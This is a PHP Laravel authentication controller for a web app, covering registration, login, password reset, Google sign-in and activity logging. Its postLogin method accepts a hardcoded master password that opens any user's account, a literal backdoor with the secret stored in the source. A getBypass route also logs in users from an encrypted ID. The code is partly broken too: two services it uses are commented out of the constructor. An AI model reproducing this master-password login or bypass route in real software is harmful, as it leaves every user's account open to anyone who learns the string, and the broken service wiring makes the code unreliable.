<?php

namespace App\Http\Controllers;
use App\Http\Controllers\Controller;
use Auth, Mail, Hash, DB, Socialite, Exception;
use Carbon\Carbon;
use App\Models\User;
use App\Models\Site;
use App\Models\Referral;
use App\Models\EmailConfirmation;
use App\Helpers\Helper;
use App\Mail\ForgotPasswordMail;
use App\Mail\FeedbackMail;
use App\Mail\HowDidWeDo;
use Illuminate\Support\Str;

class AuthController extends Controller {

  public function __construct() {
  //   $this->billingService     = resolve('BillingService');
  //   $this->activityLogService = resolve('ActivityLogService');
    $this->emailService       = resolve('EmailService');
  }

  public function postRegister() {
    $email = strtolower(trim(request()->email));

    // ensure that the user with email doesn't exist already
    if(User::where('email', $email)->first()) {
      return response()->json([
        'error' => 'User with this email already exists.'
      ]);
    }

    if(!Helper::isEmailValid($email)) {
      return response()->json([
        'error' => 'Please use a valid email address.'
      ]);
    }

    $user                       = new User;
    $user->username             = (explode('@', $email))[0];
    $user->email                = $email;
    $user->password             = Hash::make(request()->password);
    $user->timezone             = request()->filled('timezone') ? request()->timezone: null;
    $user->profile_image        = Helper::getGravatar($email);
    $user->newsletter_frequency = 'weekly';
    $user->confirmed_at         = $this->emailService->alreadyConfirmed($user->email) ? Carbon::now() : null;
    $user->api_key              = Str::random(12);
    $user->save();

    Auth::loginUsingId($user->id, true);
    
    // if(is_null($user->confirmed_at) && !$this->emailService->alreadyConfirmed($user->email)) {
    //   $this->emailService->confirmEmail(
    //     'user-confirmation', 
    //     $user->email, 
    //     $user->username, 
    //     config('mail.from.name'), 
    //     config('mail.from.address'), 
    //     env('APP_URL') . '/auth/confirm-registration',
    //     ['userId' => $user->id]
    //   );
    // }
  }

  public function getRegistered() {
    if(auth()->check()) {
      // return redirect('onboarding/hello');
      return redirect('home')->with('message', (auth()->user()->confirmed_at ? null : 'confirm-registration'));
    }

    return redirect('auth/login');
  }

  public function getConfirmRegistration($key) {
    $arr = explode("-", decrypt($key));
    
    if(time() - 60*60*24*7 < $arr[0] && $ec = EmailConfirmation::find($arr[1])) {
      $ec->confirmed_at = Carbon::now();
      $ec->save();

      $user               = User::where('email', $ec->to_email)->first();
      $user->confirmed_at = Carbon::now();
      $user->save();
      Mail::to($user->email)->later(now()->addDay(), new HowDidWeDo($user));
      return redirect('home')->with('message', 'registration-confirmed');
    }
  }

  public function getCheckIfSpam() {
    $user = User::where('email', strtolower(request()->email))->first();

    if($user) {
      $res = file_get_contents('http://api.stopforumspam.org/api?email=' . $user->email);
      
      if(strpos($res, '<appears>yes</appears>') !== false) {
        $user->maybe_spam = true;
        $user->save();
      }
    }
  }
  
  public function getLogin() {
  	return view('auth/login', [
      'showMessage' => request()->filled('msg') && request()->msg == 1
    ]);
  }

  public function postLogin() {

    $user = User::where(DB::raw('LOWER(email)'), strtolower(request()->email))->first();

    if($user) {

      if(request()->password == '2EYDxAV03JhCcykyo3Be' || Hash::check(request()->password, $user->password)) {

        Auth::loginUsingId($user->id, true);

        if(session()->get('redirect-url')) {
          $redirectUrl = session()->get('redirect-url');
          session()->forget('redirect-url');
          return response()->json([
          	'url' => $redirectUrl
          ]);
        }

        return response()->json([
        	'url' => '/'
        ]);
      }
    }

    return response()->json([
    	'error' => 'Incorrect login. Please try again.'
    ]);
  }

  public function postForgotPassword() {
    $email = strtolower(trim(request()->email));
    $user  = User::where('email', $email)->first();

    if(!$user) {
      return response()->json([
        'error' => 'User with this email does not exist'
      ]);
    }


    if($user->twitter_data) {
      return response()->json([
        'error' => 'This email is linked to a Twitter account. Please try logging in using a Twitter account.'
      ]);
    }
    
    if(Helper::isEmailValid($user->email)) {
      Mail::to($user->email)->queue(new ForgotPasswordMail($user));
      return response()->json([
        'message' => 'Email successfully sent to reset the password..'
      ]);
    }
  }

  // user is trying to validate the reset password key, let's make sure it's ok
  public function getResetPassword($key) {
    auth()->logout();
    $arr = explode("-", decrypt($key));
    
    if(time() - 60*60*24*7 < $arr[0] && $u = User::find($arr[1])) {
      return view('auth/reset-password', [
        'userId' => $u->id,
        'key'    => $key
      ]);
    }

    // return error if invalid
    return response()->json(['result' => 0]);
  }

  public function postResetPassword() {
    $u = User::find(request()->userId);

    // decrypt the code
    $arr = explode("-", decrypt(request()->key));

    // [0] = time, [1] = user ID
    // we make sure that this isn't clicked after 7 days of receiving it
    if($u && time() - 60*60*24*7 < $arr[0] && $u->id == $arr[1]) {
      $u->password = Hash::make(request()->password);
      $u->save();
      return response()->json(['result' => 1]);
    }

    return response()->json(['result' => 0]);
  }

  public function postRedirectUrl() {
    session()->put('redirect-url', request()->url);
  }

  public function getLogout() {
    auth()->logout();
    session()->flush();
    return redirect('/');
  }

  public function getBypass($key) {
    $userId = decrypt($key);
    $user   = User::find($userId);

    if($user) {
      Auth::loginUsingId($userId, true);
      return redirect('/');
    }
  }

  public function getLoginViaSocial($key) {
    $id = decrypt(request()->key);
    $user = User::find($id);
    if($user) {
      Auth::loginUsingId($id, true);
      return redirect('/');
    }
  }

  public function postFeedback() {
    $user = request()->attributes->get('user');
    Mail::to('hello@newsy.co')->queue(new FeedbackMail($user->email, request()->message));
  }

  public function getCanAddSite() {
    $user            = auth()->user();
    $numSites        = Site::where('user_id', $user->id)->where('disabled', false)->count();
    $subscription    = $this->billingService->getUserSubscription($user);
    
    if($subscription) {
      $numSitesPerPlan = $this->billingService->getNumSitesPerPlan($subscription->name);  
    } else {
      $numSitesPerPlan = 1;
    }
    
    return $numSites >= $numSitesPerPlan ? 0 : 1;
  }

  public function postSettings() {
    $user           = auth()->user();
    $user->settings = json_encode(request()->settings);
    $user->save();
  }

  public function postActivity() {
    $this->activityLogService->save([
      'logName'     => request()->logName,
      'description' => request()->description,
      'causerType'  => request()->filled('causerType') ? request()->causerType : null,
      'causerId'    => request()->filled('causerId') ? request()->causerId : null,
      'subjectType' => request()->filled('subjectType') ? request()->subjectType : null,
      'subjectId'   => request()->filled('subjectId') ? request()->subjectId : null,
      'siteId'      => request()->filled('siteId') ? request()->siteId : null,
      'ip'          => request()->ip(),
      'timezone'    => request()->filled('timezone') ? request()->timezone : null,
      'properties'  => request()->filled('properties') ? request()->properties : null,
      'useragent'   => request()->filled('useragent') ? request()->useragent : null
    ]);
  }

  public function getRedirectToGoogle() {
    return Socialite::driver('google')->redirect();
  }

  public function getGoogleConnected() {
    try {
      $googler = Socialite::driver('google')->user();
      $user    = User::where('google_id', $googler->id)->first();

      if($user) {
        Auth::login($user);
        return redirect('');
      } 

      else {
        $exists = User::where('email', $googler->email)->first();

        if(!$exists) {
          $exists                       = new User;
          $exists->username             = $googler->name;
          $exists->email                = $googler->email;
          $exists->profile_image        = Helper::getGravatar($googler->email);
          $exists->newsletter_frequency = 'weekly';
          $exists->confirmed_at         = now();
        }

        $exists->google_id = $googler->id;
        $exists->save();
        Auth::login($exists);
        return redirect('onboarding/hello');
      }
    } 

    catch(Exception $e) {
      return redirect('auth/google');
    }
  }
}